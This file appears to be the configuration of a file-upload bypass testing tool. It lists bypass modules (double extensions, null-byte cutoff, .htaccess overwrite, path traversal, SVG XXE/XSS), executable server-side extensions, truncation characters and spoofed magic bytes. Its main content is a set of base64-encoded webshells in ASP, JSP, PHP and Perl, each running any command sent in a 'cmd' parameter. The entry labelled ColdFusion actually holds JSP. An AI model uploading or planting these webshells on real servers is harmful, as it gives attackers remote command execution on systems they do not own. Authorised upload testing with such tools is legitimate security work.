# Configure markers
shell_path = "assets/shells/"
filename_marker = "*filename*"
data_marker = "*data*"
mimetype_marker = "*mimetype*"

# Configure HTTP Protocol
protocol = 'https'

# Configure modules name
active_modules = [
    "polyglot",
    "extension_shuffle",
    "double_extension",
    "discrepancy",
    "forward_double_extension",
    "reverse_double_extension",
    "stripping_extension",
    "null_byte_cutoff",
    "name_overflow_cutoff",
    "htaccess_overwrite",
    "path_traversal",
    "svg_xxe",
    "svg_xss"
]

# Modules that you do not want to scan with Anti-Malware and Detection mode
dont_scan_module = ['svg_xss', 'svg_xxe', 'htaccess_overwrite', "path_traversal"]

# Modules that you want their orginal filename and extension - Don't touch unless you know what you are doing
original_filenames = ['stripping_extension']

# Configure extensions
extensions = {

    "allow_list": ["jpg", "jpeg", "png", "gif", "pdf", "mp3", "mp4", "txt", "csv", "svg", "xml", "xlsx"],
    "com": ["com"],
    "php": ["php", "php3", "phar", "phtml", "php5", "php6", "php7", "phps", "pht", "phtm", "php4", "pgif", "php2",
            "inc", "hphp", "ctp", "module"],
    "asp": ["asp", "aspx", "config", "ashx", "asmx", "aspq", "axd", "cshtm", "cshtml", "rem", "soap",
            "vbhtm", "vbhtml", "asa", "cer", "shtml"],
    "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf", "wss", "do", "action"],
    "coldfusion": ["cfm", "cfml", "cfc", "dbm", "cFm", "cFml", "cFc", "dBm"],
    "perl": ["pl", "cgi"]
}

# Anti-Malware test strings
eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# Configure null bytes here
null_bytes = [
    '\x00',
    ";",
    "%20",
    "%0a",
    "%00",
    "%0d%0a",
    "/",
    ".\\",
    ".",
    "...."
]

# Configure mime types 
mimetypes = {
    "com": "application/octet-stream",
    "php": "application/x-httpd-php",
    "php2": "application/x-httpd-php",
    "php3": "application/x-httpd-php",
    "php4": "application/x-httpd-php",
    "php5": "application/x-httpd-php",
    "php6": "application/x-httpd-php",
    "php7": "application/x-httpd-php",
    "phps": "application/x-httpd-php",
    "pht": "application/x-httpd-php",
    "phtm": "application/x-httpd-php",
    "phtml": "application/x-httpd-php",
    "pgif": "application/x-httpd-php",
    "htaccess": "application/x-httpd-php",
    "phar": "application/x-httpd-php",
    "inc": "application/x-httpd-php",
    "hphp": "application/x-httpd-php",
    "ctp": "application/x-httpd-php",
    "module": "application/x-httpd-php",
    "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "txt": "text/plain",
    "jpg": "image/jpeg",
    "jpeg": "image/jpeg",
    "png": "image/png",
    "gif": "image/gif",
    "pdf": "application/pdf",
    "mp3": "audio/mpeg",
    "mp4": "video/mp4",
    "csv": "text/csv",
    "svg": "image/svg+xml",
    "xml": "application/xml",
    "asp": "application/x-asp",
    "aspx": "application/x-asp",
    "config": "application/x-asp",
    "ashx": "application/x-asp",
    "asmx": "application/x-asp",
    "aspq": "application/x-asp",
    "axd": "application/x-asp",
    "cshtm": "application/x-asp",
    "cshtml": "application/x-asp",
    "rem": "application/x-asp",
    "soap": "application/x-asp",
    "vbhtm": "application/x-asp",
    "vbhtml": "application/x-asp",
    "shtml": "application/x-asp",
    "asa": "application/x-asp",
    "cer": "application/x-asp",
    "jsp": "application/jsp",
    "jspx": "application/jsp",
    "jsw": "application/jsp",
    "jsv": "application/jsp",
    "jspf": "application/jsp",
    "wss": "application/jsp",
    "do": "application/jsp",
    "action": "application/jsp",
    "cfm": "application/cfm",
    "cfml": "application/cfm",
    "cfc": "application/cfm",
    "dbm": "application/cfm",
    "pl": "text/html",
    "cgi": "text/html",
    "pL": "text/html",
    "cGi": "text/html",
}

# XML mimetypes
xml_mimetypes = ['application/xml', 'text/xml', 'application/rss+xml', 'application/xhtml+xml']

# Configure magic bytes
magic_bytes = {
    "jpg": b'\xFF\xD8\xFF\xE0',
    "jpeg": b'\xFF\xD8\xFF\xE0',
    "png": b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A',
    "gif": b'GIF89',
    "bmp": b'BM',
    "zip": b'PK',
    "rar": b'Rar!',
    "exe": b'MZ',
    "pdf": b'%PDF',
    "docx": b'PK',
    "xlsx": b'PK',
    "pptx": b'PK',
    "mp3": b'ID3',
    "wav": b'RIFF',
    "mp4": b'ftypisom',
    "avi": b'RIFF',
    "mkv": b'\x1A\x45\xDF\xA3',
    "txt": b'\xEF\xBB\xBF',
    "html": b'<!DOCTYPE html>',
    "js": b'// JavaScript',
    "tar": b'ustar',
    "iso": b'CD001',
    "dll": b'MZ',
    "xml": b'<?xml',
    "json": b'{\n  \"',
    "asp": b'<%\n',
    "class": b'\xCA\xFE\xBA\xBE',
    "doc": b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1',
    "ppt": b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1',
    "xls": b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1',
    "ttf": b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1',
    "otf": b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1',
    "woff": b'wOFF',
    "woff2": b'wOF2',
    "ttc": b'ttcf',
    "mov": b'moov',
    "flv": b'FLV',
    "ogg": b'OggS',
    "aac": b'\xFF\xE1',
    "flac": b'fLaC',
    "psd": b'8BPS',
    "svg": b'<svg',
    "ai": b'\xC5d',
    "eps": b'%!PS',
    "tif": b'II*\x00',
    "tiff": b'II*\x00',
    "ico": b'\x00\x00\x01\x00',
    "dmg": b'koly',
    "apk": b'PK',
    "deb": b'21',
    "rpm": b'\xED\xAB\xEE',
    "mpg": b'\x00\x00\x01\xBA',
    "mpeg": b'\x00\x00\x01\xBA',
    "webm": b'\x1A\x45\xDF\xA3',
    "gz": b'\x1F\x8B',
    "xz": b'\xFD7zXZ\x00',
    "jar": b'PK\x03\x04',
    "bz2": b'BZh',
    "csv": b'ID,Timestamp',
    "sql": b'CREATE TABLE',
    "bak": b'BACKUP',
    "cfg": b'CONFIG',
    "ini": b'[',
    "bat": b'@echo off',
    "sh": b'#!/bin/bash',
    "pl": b'#!/usr/bin/perl',
    "rb": b'#!/usr/bin/env ruby',
    "h": b'#include',
    "cpp": b'#include <iostream>',
    "py": b'#!/usr/bin/env python',
    "java": b'public class',
    "php": b'<?php',
    "css": b'/* CSS */'
}

webshells = {
    "asp" : "PCEtLQpBU1AgV2Vic2hlbGwKV29ya2luZyBvbiBsYXRlc3QgSUlTIApSZWZlcmFuY2UgOi0gCmh0dHBzOi8vZ2l0aHViLmNvbS90ZW5uYy93ZWJzaGVsbC9ibG9iL21hc3Rlci9mdXp6ZGItd2Vic2hlbGwvYXNwL2NtZC5hc3AKaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xMTUwMTA0NC9pLW5lZWQtZXhlY3V0ZS1hLWNvbW1hbmQtbGluZS1pbi1hLXZpc3VhbC1iYXNpYy1zY3JpcHQKaHR0cDovL3d3dy53M3NjaG9vbHMuY29tL2FzcC8KLS0+CgoKPCUKU2V0IG9TY3JpcHQgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJXU0NSSVBULlNIRUxMIikKU2V0IG9TY3JpcHROZXQgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJXU0NSSVBULk5FVFdPUksiKQpTZXQgb0ZpbGVTeXMgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCkZ1bmN0aW9uIGdldENvbW1hbmRPdXRwdXQodGhlQ29tbWFuZCkKICAgIERpbSBvYmpTaGVsbCwgb2JqQ21kRXhlYwogICAgU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKICAgIFNldCBvYmpDbWRFeGVjID0gb2Jqc2hlbGwuZXhlYyh0aGVjb21tYW5kKQogICAgZ2V0Q29tbWFuZE91dHB1dCA9IG9iakNtZEV4ZWMuU3RkT3V0LlJlYWRBbGwKZW5kIEZ1bmN0aW9uCiU+CgoKPEhUTUw+CjxCT0RZPgo8Rk9STSBhY3Rpb249IiIgbWV0aG9kPSJHRVQiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY21kIiBzaXplPTQ1IHZhbHVlPSI8JT0gc3pDTUQgJT4iPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUnVuIj4KPC9GT1JNPgo8UFJFPgo8JT0gIlxcIiAmIG9TY3JpcHROZXQuQ29tcHV0ZXJOYW1lICYgIlwiICYgb1NjcmlwdE5ldC5Vc2VyTmFtZSAlPgo8JVJlc3BvbnNlLldyaXRlKFJlcXVlc3QuU2VydmVyVmFyaWFibGVzKCJzZXJ2ZXJfbmFtZSIpKSU+CjxwPgo8Yj5UaGUgc2VydmVyJ3MgcG9ydDo8L2I+CjwlUmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoInNlcnZlcl9wb3J0IikpJT4KPC9wPgo8cD4KPGI+VGhlIHNlcnZlcidzIHNvZnR3YXJlOjwvYj4KPCVSZXNwb25zZS5Xcml0ZShSZXF1ZXN0LlNlcnZlclZhcmlhYmxlcygic2VydmVyX3NvZnR3YXJlIikpJT4KPC9wPgo8cD4KPGI+VGhlIHNlcnZlcidzIGxvY2FsIGFkZHJlc3M6PC9iPgo8JVJlc3BvbnNlLldyaXRlKFJlcXVlc3QuU2VydmVyVmFyaWFibGVzKCJMT0NBTF9BRERSIikpJT4KPCUgc3pDTUQgPSByZXF1ZXN0KCJjbWQiKQp0aGlzRGlyID0gZ2V0Q29tbWFuZE91dHB1dCgiY21kIC9jIiAmIHN6Q01EKQpSZXNwb25zZS5Xcml0ZSh0aGlzRGlyKSU+CjwvcD4KPGJyPgo8L0JPRFk+CjwvSFRNTD4=",
    "cfm" : "Ly8gbm90ZSB0aGF0IGxpbnV4ID0gY21kIGFuZCB3aW5kb3dzID0gImNtZC5leGUgL2MgKyBjbWQiIAoKPEZPUk0gTUVUSE9EPUdFVCBBQ1RJT049J2NtZGpzcC5qc3AnPgo8SU5QVVQgbmFtZT0nY21kJyB0eXBlPXRleHQ+CjxJTlBVVCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz4KPC9GT1JNPgoKPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+CjwlCiAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7CiAgIFN0cmluZyBvdXRwdXQgPSAiIjsKCiAgIGlmKGNtZCAhPSBudWxsKSB7CiAgICAgIFN0cmluZyBzID0gbnVsbDsKICAgICAgdHJ5IHsKICAgICAgICAgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgY21kKTsKICAgICAgICAgQnVmZmVyZWRSZWFkZXIgc0kgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKHAuZ2V0SW5wdXRTdHJlYW0oKSkpOwogICAgICAgICB3aGlsZSgocyA9IHNJLnJlYWRMaW5lKCkpICE9IG51bGwpIHsKICAgICAgICAgICAgb3V0cHV0ICs9IHM7CiAgICAgICAgIH0KICAgICAgfQogICAgICBjYXRjaChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgIH0KICAgfQolPgoKPHByZT4KPCU9b3V0cHV0ICU+CjwvcHJlPgoKPCEtLSAgICBodHRwOi8vbWljaGFlbGRhdy5vcmcgICAyMDA2ICAgIC0tPgo=",
    "jsp" : "PCUKICAgU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsKICAgU3RyaW5nIG91dHB1dCA9ICIiOwoKICAgaWYoY21kICE9IG51bGwpIHsKICAgICAgU3RyaW5nIHMgPSBudWxsOwogICAgICBTdHJpbmcgb3NDb21tYW5kOwogICAgICAKICAgICAgLy8gRGV0ZWN0IHRoZSBvcGVyYXRpbmcgc3lzdGVtIGFuZCBzZXQgdGhlIGFwcHJvcHJpYXRlIGNvbW1hbmQKICAgICAgaWYgKFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuc3RhcnRzV2l0aCgid2luZG93cyIpKSB7CiAgICAgICAgIG9zQ29tbWFuZCA9ICJjbWQuZXhlIC9DICIgKyBjbWQ7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgIG9zQ29tbWFuZCA9IGNtZDsKICAgICAgfQoKICAgICAgdHJ5IHsKICAgICAgICAgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhvc0NvbW1hbmQpOwogICAgICAgICBCdWZmZXJlZFJlYWRlciBzSSA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CiAgICAgICAgIHdoaWxlKChzID0gc0kucmVhZExpbmUoKSkgIT0gbnVsbCkgewogICAgICAgICAgICBvdXRwdXQgKz0gczsKICAgICAgICAgfQogICAgICB9CiAgICAgIGNhdGNoKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgfQogICB9CiU+",
    "php" : "PD9waHAKICAgICRvdXRwdXQgPSBudWxsOwogICAgJHJldHZhbCA9IG51bGw7CiAgICAKICAgIGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpIHsKICAgICAgICAvLyBDYXB0dXJlIHRoZSBvdXRwdXQgYW5kIHJldHVybiB2YWx1ZSBvZiB0aGUgc3lzdGVtIGNvbW1hbmQKICAgICAgICBleGVjKCRfR0VUWydjbWQnXSwgJG91dHB1dCwgJHJldHZhbCk7CiAgICB9CgogICAgLy8gT3V0cHV0IHRoZSBjYXB0dXJlZCBvdXRwdXQKICAgIGlmKGlzX2FycmF5KCRvdXRwdXQpKSB7CiAgICAgICAgZm9yZWFjaCgkb3V0cHV0IGFzICRsaW5lKSB7CiAgICAgICAgICAgIGVjaG8gJGxpbmUgLiAiXG4iOwogICAgICAgIH0KICAgIH0KPz4=",
    "pl"  :  "IyEvdXNyL2Jpbi9wZXJsCiMKIyBQZXJsS2l0LTAuMSAtIGh0dHA6Ly93d3cudDBzLm9yZwojCiMgY21kLnBsOiBSdW4gY29tbWFuZHMgb24gYSB3ZWJzZXJ2ZXIKCnVzZSBzdHJpY3Q7CgpteSAoJGNtZCwgJUZPUk0pOwoKJHw9MTsKCnByaW50ICJDb250ZW50LVR5cGU6IHRleHQvaHRtbFxyXG4iOwpwcmludCAiXHJcbiI7CgojIEdldCBwYXJhbWV0ZXJzCgolRk9STSA9IHBhcnNlX3BhcmFtZXRlcnMoJEVOVnsnUVVFUllfU1RSSU5HJ30pOwoKaWYoZGVmaW5lZCAkRk9STXsnY21kJ30pIHsKICAkY21kID0gJEZPUk17J2NtZCd9Owp9CgpwcmludCAnPEhUTUw+Cjxib2R5Pgo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJHRVQiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY21kIiBzaXplPTQ1IHZhbHVlPSInIC4gJGNtZCAuICciPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUnVuIj4KPC9mb3JtPgo8cHJlPic7CgppZihkZWZpbmVkICRGT1JNeydjbWQnfSkgewogIHByaW50ICJSZXN1bHRzIG9mICckY21kJyBleGVjdXRpb246XG5cbiI7CiAgcHJpbnQgIi0ieDgwOwogIHByaW50ICJcbiI7CgogIG9wZW4oQ01ELCAiKCRjbWQpIDI+JjEgfCIpIHx8IHByaW50ICJDb3VsZCBub3QgZXhlY3V0ZSBjb21tYW5kIjsKCiAgd2hpbGUoPENNRD4pIHsKICAgIHByaW50OwogIH0KCiAgY2xvc2UoQ01EKTsKICBwcmludCAiLSJ4ODA7CiAgcHJpbnQgIlxuIjsKfQoKcHJpbnQgIjwvcHJlPiI7CgpzdWIgcGFyc2VfcGFyYW1ldGVycyAoJCkgewogIG15ICVyZXQ7CgogIG15ICRpbnB1dCA9IHNoaWZ0OwoKICBmb3JlYWNoIG15ICRwYWlyIChzcGxpdCgnJicsICRpbnB1dCkpIHsKICAgIG15ICgkdmFyLCAkdmFsdWUpID0gc3BsaXQoJz0nLCAkcGFpciwgMik7CiAgICAKICAgIGlmKCR2YXIpIHsKICAgICAgJHZhbHVlID1+IHMvXCsvIC9nIDsKICAgICAgJHZhbHVlID1+IHMvJSguLikvcGFjaygnYycsaGV4KCQxKSkvZWc7CgogICAgICAkcmV0eyR2YXJ9ID0gJHZhbHVlOwogICAgfQogIH0KCiAgcmV0dXJuICVyZXQ7Cn0="
}